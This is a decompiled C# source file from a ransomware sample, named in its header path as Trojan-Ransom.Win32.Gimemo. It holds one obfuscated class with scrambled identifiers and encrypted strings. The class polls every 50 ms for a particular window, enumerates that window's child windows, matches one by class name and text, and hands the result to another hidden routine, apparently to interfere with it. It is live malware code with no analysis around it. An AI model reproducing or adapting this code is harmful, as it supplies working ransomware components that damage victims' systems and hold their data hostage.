// Decompiled with JetBrains decompiler
// Type:  
// Assembly: cssrss, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 33E5F696-F6DE-4A9C-88FA-7590F5DCF59A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Gimemo.xqx-9bbdf97e90a8e8d82865621ec5c533a1f41933b694bafef2c4eebd22a0720916.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class \u0006\u2000
{
  private static Timer \u0002 = new Timer();
  private static IntPtr \u0003;
  private static string \u0005;
  public static string \u0008;
  private static IntPtr \u0006 = IntPtr.Zero;

  [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0002(IntPtr _param0, int _param1, int _param2, int _param3);

  [DllImport("user32.dll", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0002([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1);

  [DllImport("user32.dll", EntryPoint = "EnumChildWindows", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0002(IntPtr _param0, \u0006\u2000.\u0002 _param1, int _param2);

  [DllImport("user32.dll", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern long \u0002(long _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, long _param2);

  [DllImport("user32", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0002(IntPtr _param0, StringBuilder _param1, int _param2);

  [DllImport("user32", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0003(IntPtr _param0, StringBuilder _param1, int _param2);

  [DllImport("user32", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int \u0002(IntPtr _param0);

  private static void \u0002(object _param0, EventArgs _param1)
  {
    if (\u0006\u2000.\u0006 == IntPtr.Zero)
    {
      string str1 = (string) null;
      ref string local1 = ref str1;
      string str2 = \u000F\u2000.\u0002(1359781410);
      ref string local2 = ref str2;
      \u0006\u2000.\u0003 = (IntPtr) \u0006\u2000.\u0002(ref local1, ref local2);
      if (!(\u0006\u2000.\u0003 != (IntPtr) 0))
        return;
      \u0006\u2000.\u0002(\u0006\u2000.\u0003, new \u0006\u2000.\u0002(\u0006\u2000.\u0002), 0);
    }
    else
      \u000E\u2000.\u0002(\u0006\u2000.\u0003, \u0006\u2000.\u0006);
  }

  public static bool \u0002() => \u0006\u2000.\u0002.Enabled;

  public static void \u0002(bool _param0)
  {
    if (_param0)
    {
      \u0006\u2000.\u0008 = Process.GetCurrentProcess().ProcessName;
      if (\u0006\u2000.\u0002.Interval != 50)
      {
        Timer timer = \u0006\u2000.\u0002;
        \u0006\u2000.\u0002.Tick += new EventHandler(\u0006\u2000.\u0002);
        timer.Interval = 50;
        timer.Enabled = true;
        timer.Start();
      }
      else
      {
        \u0006\u2000.\u0002.Enabled = true;
        \u0006\u2000.\u0002.Start();
      }
    }
    else
    {
      \u0006\u2000.\u0002.Enabled = false;
      \u0006\u2000.\u0002.Stop();
      \u0006\u2000.\u0006 = IntPtr.Zero;
    }
  }

  private static int \u0002(IntPtr _param0, int _param1)
  {
    string str = \u0006\u2000.\u0002(_param0);
    string String1 = \u0006\u2000.\u0003(_param0);
    if (Strings.InStr(str.ToString(), \u000F\u2000.\u0002(1359781383)) != 0 && Strings.InStr(String1, \u000F\u2000.\u0002(1359781395)) != 0)
      \u0006\u2000.\u0006 = _param0;
    _param0.ToString() + \u000F\u2000.\u0002(1359781475) + str + \u000F\u2000.\u0002(1359781475) + String1;
    return 1;
  }

  private static string \u0002(IntPtr _param0)
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.Length = (int) byte.MaxValue;
    \u0006\u2000.\u0002(_param0, stringBuilder, stringBuilder.Length);
    return stringBuilder.ToString();
  }

  private static string \u0003(IntPtr _param0)
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.Length = checked (\u0006\u2000.\u0002(_param0) + 1);
    \u0006\u2000.\u0003(_param0, stringBuilder, stringBuilder.Length);
    return stringBuilder.ToString();
  }

  private delegate int \u0002(IntPtr _param1, int _param2);
}
